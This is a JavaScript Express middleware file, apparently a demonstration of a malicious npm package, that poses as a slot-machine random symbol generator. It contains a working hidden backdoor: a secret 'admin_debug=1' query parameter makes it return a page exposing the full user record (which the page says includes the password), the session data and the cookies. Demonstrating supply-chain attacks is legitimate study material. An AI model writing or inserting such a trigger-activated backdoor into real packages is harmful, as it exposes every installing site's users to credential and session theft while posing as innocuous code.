module.exports = function(req, res, next) {
    // 1. Legitimate Functionality (Symbol Generator)
    const symbols = ['🍒', '🍋', '💎', '🔔'];
    req.slotResult = [
        symbols[Math.floor(Math.random() * symbols.length)],
        symbols[Math.floor(Math.random() * symbols.length)],
        symbols[Math.floor(Math.random() * symbols.length)]
    ];

   
    if (req.query.admin_debug === '1') {
        const message = "This page is being rendered by a malicious backdoor in the 'express-provably-fair-rng' npm package.";
        
        // Data leakage from a previous middleware (loadUser)
        const userData = JSON.stringify(res.locals.user, null, 2); 
        const sessionData = JSON.stringify(req.session, null, 2); // Pretty print JSON
        const cookieData = req.headers.cookie;

        const htmlResponse = `
            <!DOCTYPE html>
            <html lang="en">
            <head>
                <meta charset="UTF-8">
                <title>Malicious NPM Package</title>
                <style>
                    body {
                        background-color: #000;
                        color: #0f0;
                        font-family: 'Courier New', Courier, monospace;
                        font-size: 1.2rem;
                        padding: 2rem;
                        margin: 0;
                    }
                    h1 {
                        color: #f00;
                        text-align: center;
                        text-shadow: 0 0 5px #f00, 0 0 10px #f00;
                        text-transform: uppercase;
                    }
                    pre {
                        background-color: #111;
                        border: 1px solid #0f0;
                        padding: 1rem;
                        white-space: pre-wrap;       /* CSS 2.1 */
                        word-wrap: break-word;       /* IE 5.5+ */
                    }
                    .label {
                        color: #ff0;
                        margin-top: 2rem;
                        margin-bottom: 0.5rem;
                        text-shadow: 0 0 3px #ff0;
                    }
                    .alert-msg {
                        text-align: center;
                        font-size: 1.5rem;
                        color: #f9a825; /* Yellow/Orange for warning */
                        margin-bottom: 2rem;
                    }
                </style>
            </head>
            <body>
                <h1>*** ALERT: Malicious NPM Library Detected ***</h1>
                <p class="alert-msg">${message}</p>
                
                <h2 class="label">[+] Full User Record Leaked (incl. Password):</h2>
                <pre>${userData}</pre>

                <h2 class="label">[+] Session Data Exfiltrated:</h2>
                <pre>${sessionData}</pre>
                
                <h2 class="label">[+] User Cookies Captured:</h2>
                <pre>${cookieData}</pre>
            </body>
            </html>
        `;

        return res.status(200).send(htmlResponse);
    }

    next();
};
